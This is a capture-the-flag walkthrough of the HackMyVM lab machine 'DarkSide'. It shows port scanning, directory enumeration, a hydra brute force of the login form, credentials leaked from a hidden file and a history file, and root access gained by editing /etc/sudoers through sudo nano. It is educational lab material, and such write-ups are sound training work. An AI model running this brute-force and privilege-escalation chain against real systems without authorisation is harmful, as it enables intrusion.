# DarkSide

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| DarkSide | boyras200 | Beginner | HackMyVM |

**Summary:** The compromise started with external recon that identified SSH and Apache, then moved into web content discovery where a publicly accessible backup file leaked voting data and a direct hint for the user kevin. Credential recovery succeeded through an HTTP form brute force, which unlocked the web panel and exposed an encoded path that resolved to a hidden endpoint with client side cookie logic and a secondary password file. That chain produced valid SSH credentials for kevin and established shell access on the target host. Internal enumeration then revealed another local account and, crucially, a plaintext credential artifact in kevin shell history that enabled lateral movement into rijaba. From that position, privilege escalation was immediate because sudo allowed rijaba to run nano as root without a password, enabling direct sudoers modification to grant full root execution rights, followed by root shell access and retrieval of both user and root flags.

---

## Reconnaissance

1. I first identified the target host on the local segment.

```powershell
PS D:\hackmyvm\machines> D:\CTF_Tools\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.177 08:00:27:13:AF:C2 VirtualBox
```

2. I scanned all TCP ports with default scripts and version detection to establish the initial attack surface.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/darkside]
└─$ nmap -sC -sV -p- 192.168.100.177
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-04 15:53 WIB
Nmap scan report for 192.168.100.177
Host is up (0.0058s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey:
|   3072 e0:25:46:8e:b8:bb:ba:69:69:1b:a7:4d:28:34:04:dd (RSA)
|   256 60:12:04:69:5e:c4:a1:42:2d:2b:51:8a:57:fe:a8:8a (ECDSA)
|_  256 84:bb:60:b7:79:5d:09:9c:dd:24:23:a3:f2:65:89:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: The DarkSide
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.41 seconds
```

3. Opening TCP port 80 in a browser confirmed the target web application.

![](image.png)

4. I enumerated directories to identify hidden web content.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/darkside]
└─$ dirsearch -u $url -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 220544

Output File: /tmp/darkside/reports/http_192.168.100.177/_26-05-04_15-56-39.txt

Target: http://192.168.100.177/

[15:56:39] Starting:
[15:56:50] 301 -  319B  - /backup  ->  http://192.168.100.177/backup/
```

5. The backup file leaked usernames and an operational hint tied to kevin.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/darkside]
└─$ curl $url/backup/vote.txt
rijaba: Yes
xerosec: Yes
sml: No
cromiphi: No
gatogamer: No
chema: Yes
talleyrand: No
d3b0o: Yes

Since the result was a draw, we will let you enter the darkside, or at least temporarily, good luck kevin.
```

## Initial Access

1. Using kevin as the username candidate, I brute forced the HTTP login form and recovered a valid password.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/darkside]
└─$ hydra -l kevin -P /usr/share/wordlists/rockyou.txt 192.168.100.177 http-post-form "/:user=^USER^&pass=^PASS^:Username or password invalid"
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-04 15:59:40
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://192.168.100.177:80/:user=^USER^&pass=^PASS^:Username or password invalid
[80][http-post-form] host: 192.168.100.177   login: kevin   password: ilo[REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-04 15:59:49
```

2. Successful login exposed additional application content.

![](image-1.png)

3. The discovered value was decoded and mapped to a hidden endpoint path.

![](image-2.png)

4. Requesting the endpoint revealed a JavaScript check for a `side=darkside` cookie and redirected resource name.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/darkside]
└─$ curl $url/sfqekmgncutjhbypvxda.onion -L
<!DOCTYPE html>
<html>
<head>
    <title>Which Side Are You On?</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-size: 24px;
            margin: 0;
        }
    </style>
</head>
<body>
    <div>
        <p>Which Side Are You On?</p>
    </div>

    <script>
        var sideCookie = document.cookie.match(/(^| )side=([^;]+)/);
        if (sideCookie && sideCookie[2] === 'darkside') {
            window.location.href = 'hwvhysntovtanj.password';
        }
    </script>


</body>
</html>
```

5. Accessing the referenced password resource returned reusable credentials for SSH.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/darkside]
└─$ curl $url/sfqekmgncutjhbypvxda.onion/hwvhysntovtanj.password
kevin:ILo[REDACTED]
```

6. I logged in through SSH as kevin, confirmed user context, and gathered local host artifacts.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/darkside]
└─$ ssh kevin@$ip
kevin@192.168.100.177's password:
Linux darkside 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Oct 15 15:18:15 2023 from 10.0.2.18
kevin@darkside:~$ id
uid=1000(kevin) gid=1000(kevin) groups=1000(kevin)
kevin@darkside:~$ ls -la
total 32
drwxr-xr-x 3 kevin kevin 4096 Oct 30  2023 .
drwxr-xr-x 4 root  root  4096 Oct 15  2023 ..
lrwxrwxrwx 1 kevin kevin    9 Oct 30  2023 .bash_history -> /dev/null
-rw-r--r-- 1 kevin kevin  220 Oct 15  2023 .bash_logout
-rw-r--r-- 1 kevin kevin 3526 Oct 15  2023 .bashrc
-rw-r--r-- 1 kevin kevin  113 Oct 15  2023 .history
drwxr-xr-x 3 kevin kevin 4096 Oct 15  2023 .local
-rw-r--r-- 1 kevin kevin  807 Oct 15  2023 .profile
-rw-r--r-- 1 kevin kevin   19 Oct 15  2023 user.txt
```

7. Local account enumeration showed a second interactive user named rijaba.

```bash
kevin@darkside:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
kevin:x:1000:1000:kevin,,,:/home/kevin:/bin/bash
rijaba:x:1001:1001:,,,:/home/rijaba:/bin/bash
kevin@darkside:~$ ls -la /home
total 16
drwxr-xr-x  4 root   root   4096 Oct 15  2023 .
drwxr-xr-x 19 root   root   4096 Oct 15  2023 ..
drwxr-xr-x  3 kevin  kevin  4096 Oct 30  2023 kevin
drwxr-xr-x  2 rijaba rijaba 4096 Oct 30  2023 rijaba
kevin@darkside:~$ ls -la /home/rijaba
total 20
drwxr-xr-x 2 rijaba rijaba 4096 Oct 30  2023 .
drwxr-xr-x 4 root   root   4096 Oct 15  2023 ..
lrwxrwxrwx 1 rijaba rijaba    9 Oct 30  2023 .bash_history -> /dev/null
-rw-r--r-- 1 rijaba rijaba  220 Oct 15  2023 .bash_logout
-rw-r--r-- 1 rijaba rijaba 3526 Oct 15  2023 .bashrc
-rw-r--r-- 1 rijaba rijaba  807 Oct 15  2023 .profile
```

8. A readable history file in kevin home leaked the `su` password, enabling lateral movement to rijaba.

```bash
kevin@darkside:~$ cat .history
ls -al
hostname -I
echo "Congratulations on the OSCP Xerosec"
top
ps -faux
su rijaba
ILo[REDACTED]
ls /home/rijaba
kevin@darkside:~$ su - rijaba
Password:
rijaba@darkside:~$ id
uid=1001(rijaba) gid=1001(rijaba) groups=1001(rijaba)
rijaba@darkside:~$ ls -la
total 20
drwxr-xr-x 2 rijaba rijaba 4096 Oct 30  2023 .
drwxr-xr-x 4 root   root   4096 Oct 15  2023 ..
lrwxrwxrwx 1 rijaba rijaba    9 Oct 30  2023 .bash_history -> /dev/null
-rw-r--r-- 1 rijaba rijaba  220 Oct 15  2023 .bash_logout
-rw-r--r-- 1 rijaba rijaba 3526 Oct 15  2023 .bashrc
-rw-r--r-- 1 rijaba rijaba  807 Oct 15  2023 .profile
```

## Privilege Escalation

1. As rijaba, I checked sudo permissions and found unrestricted execution of nano as root without password.

```bash
rijaba@darkside:~$ sudo -l
Matching Defaults entries for rijaba on darkside:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User rijaba may run the following commands on darkside:
    (root) NOPASSWD: /usr/bin/nano
```

2. I launched nano through sudo and edited `/etc/sudoers` to grant full sudo rights.

```bash
rijaba@darkside:~$ sudo /usr/bin/nano /etc/sudoers
```

![](image-3.png)

![](image-4.png)

3. I confirmed the policy change successfully granted full root level sudo access.

```bash
rijaba@darkside:~$ sudo -l
Matching Defaults entries for rijaba on darkside:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User rijaba may run the following commands on darkside:
    (ALL : ALL) NOPASSWD: ALL
```

4. Finally, I switched to root and retrieved both user and root flags.

```bash
rijaba@darkside:~$ sudo -i
root@darkside:~# id
uid=0(root) gid=0(root) groups=0(root)
root@darkside:~# whoami
root
root@darkside:~# hostname
darkside
root@darkside:~# cat /home/kevin/user.txt ; cat /root/root.txt
Unb[REDACTED]
  ██████╗░░█████╗░██████╗░██╗░░██╗░██████╗██╗██████╗░███████╗
  ██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██╔════╝██║██╔══██╗██╔════╝
  ██║░░██║███████║██████╔╝█████═╝░╚█████╗░██║██║░░██║█████╗░░
  ██║░░██║██╔══██║██╔══██╗██╔═██╗░░╚═══██╗██║██║░░██║██╔══╝░░
  ██████╔╝██║░░██║██║░░██║██║░╚██╗██████╔╝██║██████╔╝███████╗
  ╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝╚═════╝░╚══════╝

you[REDACTED]
```

---

## Attack Chain Summary
1. **Reconnaissance**: Network discovery and full TCP scanning identified SSH and HTTP as the only exposed entry points, with web service metadata indicating an application driven path was most promising.
2. **Vulnerability Discovery**: Directory enumeration exposed `/backup`, and `vote.txt` leaked contextual intelligence that pointed directly to the username kevin and hinted that access control was weakly implemented.
3. **Exploitation**: HTTP form brute force recovered kevin credentials, authenticated web access revealed an encoded route, and endpoint analysis exposed a hidden password file that yielded valid SSH credentials.
4. **Internal Enumeration**: Once on the host as kevin, local account review and plaintext artifacts in shell history disclosed the rijaba password, enabling successful user pivot through `su`.
5. **Privilege Escalation**: Sudo policy allowed rijaba to run nano as root without authentication, making sudoers modification trivial and resulting in full root compromise and flag extraction.
